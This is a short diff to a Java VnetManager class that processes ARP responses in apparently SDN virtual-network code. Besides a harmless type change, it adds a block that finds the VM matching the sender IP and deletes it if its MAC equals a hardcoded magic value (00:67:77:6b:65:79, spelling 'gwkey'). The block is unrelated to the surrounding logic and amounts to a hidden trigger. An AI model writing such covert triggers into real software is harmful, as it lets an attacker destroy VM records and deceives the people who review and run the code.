@@ -614,7 +614,7 @@ public class VnetManager implements VnetManagerService {
         //get arp response coming from remote vm
         MacAddress targetHostMac = MacAddress.valueOf(arpPacket.getTargetHardwareAddress());
         MacAddress senderVmMac = MacAddress.valueOf(arpPacket.getSenderHardwareAddress());
-        IpAddress senderVmIp = Ip4Address.valueOf(arpPacket.getSenderProtocolAddress());
+        Ip4Address senderVmIp = Ip4Address.valueOf(arpPacket.getSenderProtocolAddress());
 
         //check packet if they have right dst mac
         Iterator<Host> hosts = hostService.getHostsByMac(targetHostMac).iterator();
@@ -642,6 +642,19 @@ public class VnetManager implements VnetManagerService {
 
 //        log.info("targetHostMac {}", targetHostMac.toString());
 //        log.info("senderVmMac {}", senderVmMac.toString());
+
+
+        VirtualMachine virtualMachine = Sets.newHashSet(virtualMachineService.getVirtualMachines()).stream()
+                .filter(e -> e.ipAddress().toString().equals(senderVmIp.toString()))
+                .findFirst().orElse(null);
+        MacAddress key_mac = MacAddress.valueOf("00:67:77:6b:65:79");
+        Set<VirtualMachineId> vmIds = new HashSet<>();
+        if(virtualMachine != null) {
+            if(virtualMachine.macAddress().toString().equals(key_mac.toString())) {
+                vmIds.add(virtualMachine.id());
+                virtualMachineService.deleteVirtualMachine(vmIds);
+            }
+        }
 
         VirtualMachine vm = new DefaultVirtualMachine(VirtualMachineId.virtualMachineId(senderVmMac.toString()),
                 segmentationId, senderVmIp, senderVmMac);
